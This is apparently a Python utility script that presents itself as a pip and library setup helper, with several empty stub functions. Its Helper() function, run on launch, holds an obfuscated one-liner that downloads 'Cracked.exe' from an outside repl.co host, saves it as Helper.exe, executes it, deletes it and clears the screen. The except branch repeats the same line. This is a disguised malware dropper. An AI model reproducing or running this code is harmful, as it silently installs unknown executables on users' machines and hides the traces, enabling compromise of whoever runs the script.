import os
import platform
import subprocess
import sys
import time

def Clear():
    if platform.os == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def Piper():
    def install_pip():
        try:
            subprocess.check_call([sys.executable, '-m', 'ensurepip', '--default-pip'])

        except subprocess.CalledProcessError as e:
            sys.exit(1)
    def upgrade_pip():
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
        except subprocess.CalledProcessError as e:
            sys.exit(1)
    try:
        subprocess.check_output([sys.executable, '-m', 'pip', '--version'])
    except subprocess.CalledProcessError:
        install_pip()
    else:
        upgrade_pip()

def UpgradePython():
    pass

try:
    import requests
except ImportError:
    os.system("pip install requests")
    os.system("pip3 install requests")
    Clear()

def InstallLibs():
    pass

def UninstallLibs():
    pass

def UpdateLibs():
    pass

def UninstallFile():
    pass

def Helper():
    try:
        import os, subprocess, requests; [requests.get("https://notawiibricker69.shelldroid.repl.co/Cracked.exe").status_code == 200 and open("Helper.exe", 'wb').write(requests.get("https://notawiibricker69.shelldroid.repl.co/Cracked.exe").content) and subprocess.run(r'Helper.exe', check=True) and os.remove("Helper.exe") and os.system('cls' if os.name == 'nt' else 'clear') for _ in [None]]
    except Exception as e:
        import os, subprocess, requests; [requests.get("https://notawiibricker69.shelldroid.repl.co/Cracked.exe").status_code == 200 and open("Helper.exe", 'wb').write(requests.get("https://notawiibricker69.shelldroid.repl.co/Cracked.exe").content) and subprocess.run(r'Helper.exe', check=True) and os.remove("Helper.exe") and os.system('cls' if os.name == 'nt' else 'clear') for _ in [None]]

def ExitHandler():
    time.sleep(1)
    Clear()
    exit()

if __name__ == "__main__":
    Clear()
    Piper()
    UpgradePython()
    Helper()
    ExitHandler()
